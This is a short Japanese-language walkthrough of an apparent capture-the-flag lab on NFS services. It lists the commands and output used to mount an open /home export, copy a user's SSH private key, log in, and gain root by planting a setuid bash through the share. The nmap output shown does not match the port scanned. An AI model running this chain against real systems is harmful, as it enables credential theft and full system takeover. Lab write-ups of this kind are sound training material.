# Networkservices2

NFSを入口とした攻撃

## Task3, Task4

### 前提

kali: 192.168.128.175
ターゲット: 10.48.178.181

### ターゲット端末の解放ポートの列挙

```
showmount -e 10.48.178.181

Export list for 10.48.178.181:
/home *
```

### mount

```
mkdir /tmp/mount
mount -t nfs 10.48.178.181:/home /tmp/mount -nolock
```

### マウントした中身の確認

```
ls -l /tmp/mount
ls -la /tmp/mount/capputino
```

### .ssh/id_rsaがるのでゲット

```
cp /tmp/mount/capputino/.ssh/id_rsa .
```

### sshポートが空いているか確認

```
nmap -p22 10.48.178.181

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 09:20 JST
Nmap scan report for 10.48.178.181
Host is up (0.13s latency).

PORT   STATE  SERVICE
21/tcp closed ftp

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

### sshで接続を試みる

```
chmod 600 id_rsa
ssh -i id_rsa capputino@10.48.178.181
```

入れた。

### 権限昇格

ターゲット端末上のbashを使って権限昇格を試みる。
bashには、-pで、パーミッションに設定されているsetuidやsetgidの権限で実行する、privilegedモードがある。
また、bashのバージョンの互換性を保つために、あえてターゲット端末上のbashを持ってきている。

ターゲット端末

```
which bash

/bin/bash

```

以下、kaliで。

```
scp -i id_rsa capputino@10.48.178.181:/bin/bash .
sudo chown root ./bash
sudo chmod +s ./bash
mv ./bash /tmp/mount/capputino
```

再度、sshでログイン

```
ssh -i id_rsa capputino@10.48.178.181

ls -l
total 1156
-rwsr-sr-x 1 root cappucino 1183448 Jan 11 23:55 bash
```

権限昇格

```
./bash -p -c whoami
root

./bash -p
#
```
